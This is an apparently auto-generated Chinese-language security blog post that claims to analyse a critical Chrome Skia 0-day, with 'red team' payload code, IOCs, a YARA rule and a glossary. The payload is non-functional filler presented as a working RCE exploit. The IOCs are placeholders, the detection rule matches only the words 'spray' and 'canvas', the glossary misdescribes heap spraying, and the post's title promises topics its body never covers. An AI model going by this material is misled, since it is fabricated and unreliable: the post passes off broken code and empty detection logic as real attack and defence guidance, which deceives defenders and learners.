---
layout: post
title:  "⚡ Weekly Recap: Chrome 0-Days, Router Botnets, AWS Breach, Rogue AI Agents & More"
date:   2026-03-16 18:53:13 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Google Chrome 0-Day 漏洞：利用與防禦繞過
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Heap Spraying, Deserialization, Use-After-Free

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Google Chrome 的 Skia 2D 圖形庫存在一個邊界檢查漏洞，允許攻擊者進行 Out-of-Bounds Write，從而實現 RCE。
* **攻擊流程圖解**: 
  1. 攻擊者創建一個特製的網頁，包含惡意的 JavaScript 代碼。
  2. 網頁被加載到 Google Chrome 中，惡意代碼被執行。
  3. 惡意代碼利用 Skia 2D 圖形庫的漏洞，實現 Out-of-Bounds Write。
  4. 攻擊者可以利用這個漏洞執行任意代碼，實現 RCE。
* **受影響元件**: Google Chrome 146.0.7680.75/76 版本之前的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個特製的網頁，包含惡意的 JavaScript 代碼。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意 JavaScript 代碼
      var spray = new Array(0x1000);
      for (var i = 0; i < spray.length; i++) {
        spray[i] = new Object();
      }
      // 利用 Skia 2D 圖形庫的漏洞，實現 Out-of-Bounds Write
      var canvas = document.createElement('canvas');
      canvas.width = 0x1000;
      canvas.height = 0x1000;
      var ctx = canvas.getContext('2d');
      ctx.fillStyle = 'rgba(0, 0, 0, 1)';
      ctx.fillRect(0, 0, 0x1000, 0x1000);
      // 執行任意代碼
      var shellcode = new Uint8Array([0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90]);
      var buffer = new ArrayBuffer(shellcode.length);
      var view = new DataView(buffer);
      for (var i = 0; i < shellcode.length; i++) {
        view.setUint8(i, shellcode[i]);
      }
      // 利用漏洞執行 shellcode
      ctx.drawImage(canvas, 0, 0);
    
    ```
* **繞過技術**: 攻擊者可以利用 WAF 繞過技巧，例如使用 Base64 編碼的惡意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/malware |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Chrome_0day {
        meta:
          description = "Detects Chrome 0-day exploit"
          author = "Your Name"
        strings:
          $s1 = "spray" ascii
          $s2 = "canvas" ascii
        condition:
          all of them
      }
    
    ```
* **緩解措施**: 更新 Google Chrome 至最新版本，禁用 JavaScript 代碼的執行。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying**: 一種利用堆疊溢位漏洞的攻擊技術，通過創建大量的物件來佔據堆疊空間，從而實現任意代碼的執行。
* **Deserialization**: 將序列化的數據轉換回原始的物件或結構，可能會導致安全漏洞。
* **Use-After-Free**: 一種利用已經釋放的記憶體空間的攻擊技術，可能會導致任意代碼的執行。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/weekly-recap-chrome-0-days-router.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


